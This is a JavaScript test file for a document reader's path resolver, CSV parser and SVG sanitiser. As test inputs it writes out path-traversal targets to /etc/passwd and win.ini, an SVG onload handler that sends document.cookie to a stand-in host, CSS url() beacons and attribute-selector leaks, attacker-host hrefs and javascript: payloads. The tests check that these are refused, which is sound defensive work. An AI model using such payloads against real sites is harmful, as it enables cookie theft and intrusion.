// The document reader's four decisions (ui/documents.js).
//
// Most of that module is a walk over a parsed XML tree and needs a DOM to test
// at all. These four do not: they are the pieces where the module decides
// something rather than copies something, and two of them are the difference
// between a reader and a way out of the archive.
//
// resolveFrom() is the one that matters most. Every picture drawn out of a
// document is named by a relationship target the *document* supplied, and the
// module's rule is that a target is resolved and then *looked up* in the
// archive's own key set - never opened as a path. These tests hold the resolver
// to producing a key, so a target that climbs out of the package produces a key
// that is not in the archive rather than a path that is somewhere on a disk.

import { test } from 'node:test';
import assert from 'node:assert/strict';

import {
  canReadDocument, parseDelimited, resolveFrom, colIndex, slideNo, scrub,
} from '../web/assets/js/ui/documents.ts';

test('it claims the formats it has readers for', () => {
  for (const ext of ['docx', 'pptx', 'xlsx', 'odt', 'ods', 'odp', 'csv', 'tsv', 'svg', 'cbz']) {
    assert.equal(canReadDocument(ext), true, ext);
  }
  // Case does not decide it: meta.ext is whatever the filename had.
  assert.equal(canReadDocument('DOCX'), true);
  // PDF has a renderer of its own and markdown has one of its own; neither is
  // this module's, and claiming them here would take the file off both.
  for (const ext of ['pdf', 'md', 'jpg', 'mp4', 'zip', '', undefined, null]) {
    assert.equal(canReadDocument(ext), false, String(ext));
  }
});

// ---------------------------------------------------------------------------
// Relationship targets
// ---------------------------------------------------------------------------

test('a relationship target resolves against the part that named it', () => {
  assert.equal(resolveFrom('ppt/slides/', '../media/image1.png'), 'ppt/media/image1.png');
  assert.equal(resolveFrom('ppt/slides/', 'media/image1.png'), 'ppt/slides/media/image1.png');
  assert.equal(resolveFrom('word/', 'media/pic.jpg'), 'word/media/pic.jpg');
});

test('a target that climbs out of the package cannot name anything outside it', () => {
  // It resolves to *some* key; the safety is that the key is then looked up in
  // the archive, and no archive has an entry called this. What must not happen
  // is a leading slash or a surviving `..`, either of which would be a path
  // rather than a key if it ever reached something that opens paths.
  for (const evil of ['../../../../etc/passwd', '/etc/passwd', '..\\..\\windows\\win.ini']) {
    const out = resolveFrom('word/', evil);
    assert.doesNotMatch(out, /(^|\/)\.\.(\/|$)/, out);
    assert.doesNotMatch(out, /^\//, out);
  }
});

test('single dots and empty segments are dropped', () => {
  assert.equal(resolveFrom('word/', './media/./pic.png'), 'word/media/pic.png');
  assert.equal(resolveFrom('word/', 'media//pic.png'), 'word/media/pic.png');
});

// ---------------------------------------------------------------------------
// Spreadsheet cell references
// ---------------------------------------------------------------------------

test('a column letter becomes its index', () => {
  assert.equal(colIndex('A1'), 0);
  assert.equal(colIndex('B7'), 1);
  assert.equal(colIndex('Z1'), 25);
  assert.equal(colIndex('AA1'), 26);
  assert.equal(colIndex('AB100'), 27);
});

test('a reference that is not one answers -1 rather than a position', () => {
  // -1 is what makes the caller push the cell on the end instead of padding to
  // a nonsense column. A row of three values must not become a row of millions.
  for (const bad of ['', '7', '1A', '$A$1', 'a1']) assert.equal(colIndex(bad), -1, bad);
});

// ---------------------------------------------------------------------------
// Slide and sheet order
// ---------------------------------------------------------------------------

test('parts sort by their number and not by their name', () => {
  const paths = ['ppt/slides/slide10.xml', 'ppt/slides/slide2.xml', 'ppt/slides/slide1.xml'];
  const sorted = [...paths].sort((a, b) => slideNo(a) - slideNo(b));
  assert.deepEqual(sorted, [
    'ppt/slides/slide1.xml', 'ppt/slides/slide2.xml', 'ppt/slides/slide10.xml',
  ]);
  // Sorted as strings, slide10 lands second and slide2 last - a deck read in
  // the wrong order, and the whole reason this is not a plain sort.
  assert.deepEqual([...paths].sort(), [
    'ppt/slides/slide1.xml', 'ppt/slides/slide10.xml', 'ppt/slides/slide2.xml',
  ]);
});

// ---------------------------------------------------------------------------
// Delimited files
// ---------------------------------------------------------------------------

test('plain rows and columns', () => {
  assert.deepEqual(parseDelimited('a,b\n1,2\n', ','), [['a', 'b'], ['1', '2']]);
});

test('a quoted field may hold the delimiter, a newline and a quote', () => {
  assert.deepEqual(parseDelimited('"a,b",c\n', ','), [['a,b', 'c']]);
  assert.deepEqual(parseDelimited('"two\nlines",c\n', ','), [['two\nlines', 'c']]);
  assert.deepEqual(parseDelimited('"say ""hi""",c\n', ','), [['say "hi"', 'c']]);
});

test('CRLF line endings do not leave a carriage return in the last cell', () => {
  assert.deepEqual(parseDelimited('a,b\r\n1,2\r\n', ','), [['a', 'b'], ['1', '2']]);
});

test('a file with no trailing newline keeps its last row', () => {
  assert.deepEqual(parseDelimited('a,b\n1,2', ','), [['a', 'b'], ['1', '2']]);
});

test('empty fields are kept, because a gap in a row is data', () => {
  assert.deepEqual(parseDelimited('a,,c\n', ','), [['a', '', 'c']]);
  assert.deepEqual(parseDelimited(',,\n', ','), [['', '', '']]);
});

test('an unterminated quote runs to the end rather than looping', () => {
  const out = parseDelimited('"never closed\nand more', ',');
  assert.equal(out.length, 1);
  assert.match(out[0][0], /never closed/);
});

test('other delimiters work the same', () => {
  assert.deepEqual(parseDelimited('a;b\n1;2\n', ';'), [['a', 'b'], ['1', '2']]);
  assert.deepEqual(parseDelimited('a\tb\n1\t2\n', '\t'), [['a', 'b'], ['1', '2']]);
});

test('an empty file has no rows', () => {
  assert.deepEqual(parseDelimited('', ','), []);
});

// ---------------------------------------------------------------------------
// scrub() - the SVG allow-list
//
// CLAUDE.md names this as the app's single exception to "nothing that reads a
// foreign document may touch innerHTML": an SVG is parsed detached and walked,
// and what survives the walk is imported into the page. It is the only place a
// stranger's markup is admitted at all, and it had no test in either direction
// - tests/csp.test.js asserts the policy that is supposed to be the *second*
// lock, and the first one was defended by nothing.
//
// A fake element rather than a DOM, the way tests/markdown.test.js and
// tests/trash.test.js do it. It records only what scrub() touches: a local
// name, an attribute map, children, and text.
// ---------------------------------------------------------------------------

class El {
  constructor(localName, attrs = {}, children = []) {
    this.localName = localName;
    this._attrs = new Map(Object.entries(attrs));
    this._children = children;
    this.text = '';
    for (const c of children) c.parent = this;
  }

  get attributes() {
    return [...this._attrs].map(([name, value]) => ({ name, value }));
  }

  get children() { return this._children; }

  removeAttribute(name) { this._attrs.delete(name); }
  getAttribute(name) { return this._attrs.get(name) ?? null; }
  has(name) { return this._attrs.has(name); }
  remove() {
    const kids = this.parent?._children;
    if (kids) kids.splice(kids.indexOf(this), 1);
  }

  replaceChildren() { this._children = []; }
  set textContent(v) { this.text = String(v); this._children = []; }
  get textContent() { return this.text; }

  /** Every element in this subtree, for asserting over the whole result. */
  all(out = []) {
    out.push(this);
    for (const c of this._children) c.all(out);
    return out;
  }
}

test('the root element is scrubbed, not only its children', () => {
  // `<svg onload="...">` is the classic form and it survived: the walk iterated
  // node.children and never looked at the node it was handed, so every
  // attribute on the document element went into the page verbatim.
  const root = new El('svg', {
    xmlns: 'http://www.w3.org/2000/svg',
    onload: "fetch('//x/' + document.cookie)",
    style: 'background:url(//x/beacon)',
  });
  scrub(root);
  assert.equal(root.has('onload'), false, 'an onload handler on the root survived');
  assert.equal(root.has('style'), false, 'a style attribute on the root survived');
  assert.equal(root.has('xmlns'), true, 'the namespace is not a reference and stays');
});

test('an event handler is dropped wherever it is', () => {
  const root = new El('svg', {}, [
    new El('rect', { onclick: 'alert(1)', fill: 'red' }),
    new El('g', {}, [new El('circle', { onmouseover: 'alert(1)' })]),
  ]);
  scrub(root);
  for (const node of root.all()) {
    for (const { name } of node.attributes) {
      assert.ok(!name.startsWith('on'), `${node.localName} kept ${name}`);
    }
  }
  assert.equal(root.children[0].getAttribute('fill'), 'red', 'and the drawing survives');
});

test('a style attribute is a reference to somewhere else', () => {
  // The module header says "every attribute that is a reference to somewhere
  // else is dropped", and the filter had no case for `style` - so
  // style="fill:url(//attacker/track.svg#a)" on any allowed child reached the
  // page and made the request.
  const root = new El('svg', {}, [new El('rect', { style: 'fill:url(//attacker/track.svg#a)' })]);
  scrub(root);
  assert.equal(root.children[0].has('style'), false);
});

test('a style element is emptied, because its CSS is not scoped to the drawing', () => {
  // An inline <style> inside an SVG subtree is a *document* stylesheet. SVG_OK
  // carries 'style' and nothing ever filtered text content, so an opened
  // drawing could restyle and leak from the whole app.
  const style = new El('style', {});
  style.text = '*{display:none} input[value^="a"]{background:url(//x/a)}';
  const root = new El('svg', {}, [style]);
  scrub(root);
  assert.equal(root.children.length, 1, 'kept, so the tree still reads as itself');
  assert.equal(root.children[0].textContent, '', 'and carries no rules');
});

test('an xlink href is caught under any prefix the file chose', () => {
  // The test named `xlink:href` literally, and a prefix is the author's to
  // choose: binding the same namespace as `xl:` kept the attribute.
  const root = new El('svg', {}, [
    new El('use', { 'xlink:href': 'https://attacker/x.svg#a' }),
    new El('use', { 'xl:href': 'https://attacker/x.svg#a' }),
    new El('use', { 'href': 'https://attacker/x.svg#a' }),
  ]);
  scrub(root);
  for (const use of root.children) {
    assert.deepEqual(use.attributes, [], `${JSON.stringify(use.attributes)} survived`);
  }
});

test('a fragment reference is the one form kept', () => {
  // <use href="#thing"> is how an SVG refers to its own parts, and dropping it
  // would break every legitimate symbol.
  const root = new El('svg', {}, [new El('use', { href: '#thing' })]);
  scrub(root);
  assert.equal(root.children[0].getAttribute('href'), '#thing');
});

test('an element that is not on the allow-list is dropped whole', () => {
  const root = new El('svg', {}, [
    new El('script', {}, [new El('path', {})]),
    new El('foreignObject', {}),
    new El('path', { d: 'M0 0' }),
  ]);
  scrub(root);
  assert.deepEqual(root.children.map(c => c.localName), ['path']);
});

test('javascript: and data:text/html are refused in any attribute', () => {
  const root = new El('svg', {}, [
    new El('a', { href: 'javascript:alert(1)' }),
    new El('rect', { fill: 'data:text/html,<script>alert(1)</script>' }),
  ]);
  scrub(root);
  for (const node of root.all()) assert.deepEqual(node.attributes, []);
});

test('a tree deeper than the cap is emptied rather than overflowing the stack', { timeout: 5000 }, () => {
  let node = new El('path', {});
  for (let i = 0; i < 2000; i++) node = new El('g', {}, [node]);
  const root = new El('svg', {}, [node]);
  assert.doesNotThrow(() => scrub(root));
});

test('an ordinary drawing comes through unchanged', () => {
  // The half that matters as much as the refusals: a sanitiser that eats real
  // files is a sanitiser people turn off.
  const root = new El('svg', { xmlns: 'http://www.w3.org/2000/svg', viewBox: '0 0 16 16' }, [
    new El('g', { fill: 'none', stroke: 'currentColor' }, [
      new El('path', { d: 'M1 1 L15 15', 'stroke-width': '2' }),
      new El('circle', { cx: '8', cy: '8', r: '4' }),
    ]),
  ]);
  scrub(root);
  assert.equal(root.getAttribute('viewBox'), '0 0 16 16');
  assert.equal(root.children[0].getAttribute('stroke'), 'currentColor');
  assert.equal(root.children[0].children[0].getAttribute('d'), 'M1 1 L15 15');
  assert.equal(root.children[0].children[1].getAttribute('r'), '4');
});
